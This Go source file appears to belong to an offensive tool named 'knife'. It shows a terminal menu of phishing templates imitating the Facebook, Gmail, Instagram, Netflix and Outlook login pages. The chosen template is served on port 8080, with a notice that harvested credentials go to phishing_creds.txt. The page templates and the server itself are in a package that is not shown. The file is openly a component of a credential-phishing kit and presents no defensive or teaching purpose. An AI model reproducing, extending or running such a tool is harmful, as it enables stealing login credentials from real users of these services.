package phish

import (
	"fmt"
	"os"

	"github.com/charmbracelet/bubbles/list"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"

	"knife/modules/phish/web"
	"knife/tui"
)

type templateItem struct {
	title       string
	description string
}

func (i templateItem) Title() string       { return i.title }
func (i templateItem) Description() string { return i.description }
func (i templateItem) FilterValue() string { return i.title }

type phishModel struct {
	list   list.Model
	chosen string
}

func (m phishModel) Init() tea.Cmd {
	return nil
}

func (m phishModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q", "esc":
			return m, tea.Quit
		case "enter":
			if i, ok := m.list.SelectedItem().(templateItem); ok {
				m.chosen = i.title
			}
			return m, tea.Quit
		}
	case tea.WindowSizeMsg:
		h, v := lipgloss.NewStyle().Margin(1, 2).GetFrameSize()
		m.list.SetSize(msg.Width-h, msg.Height-v)
	}

	var cmd tea.Cmd
	m.list, cmd = m.list.Update(msg)
	return m, cmd
}

func (m phishModel) View() string {
	return lipgloss.NewStyle().Margin(1, 2).Render(m.list.View())
}

// RunPhishModule displays the phishing template selection
func RunPhishModule() {
	items := []list.Item{
		templateItem{
			title:       "Facebook",
			description: "Facebook login page phishing template",
		},
		templateItem{
			title:       "Gmail",
			description: "Gmail login page phishing template",
		},
		templateItem{
			title:       "Instagram",
			description: "Instagram login page phishing template",
		},
		templateItem{
			title:       "Netflix",
			description: "Netflix login page phishing template",
		},
		templateItem{
			title:       "Outlook",
			description: "Outlook login page phishing template",
		},
	}

	delegate := list.NewDefaultDelegate()
	delegate.Styles.SelectedTitle = tui.SelectedItemStyle
	delegate.Styles.SelectedDesc = tui.SelectedItemStyle.Copy().Foreground(tui.SubtleColor)

	l := list.New(items, delegate, 0, 0)
	l.Title = "🎣 Phishing Templates"
	l.Styles.Title = tui.TitleStyle
	l.SetShowStatusBar(false)
	l.SetFilteringEnabled(false)

	m := phishModel{list: l}

	p := tea.NewProgram(m, tea.WithAltScreen())
	finalModel, err := p.Run()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		return
	}

	if m, ok := finalModel.(phishModel); ok && m.chosen != "" {
		fmt.Println()
		fmt.Println(tui.RenderInfo(fmt.Sprintf("Starting %s phishing server on port 8080...", m.chosen)))
		fmt.Println(tui.RenderWarning("Credentials will be logged to phishing_creds.txt"))
		fmt.Println()
		web.Launch(m.chosen, 8080)
	}
}
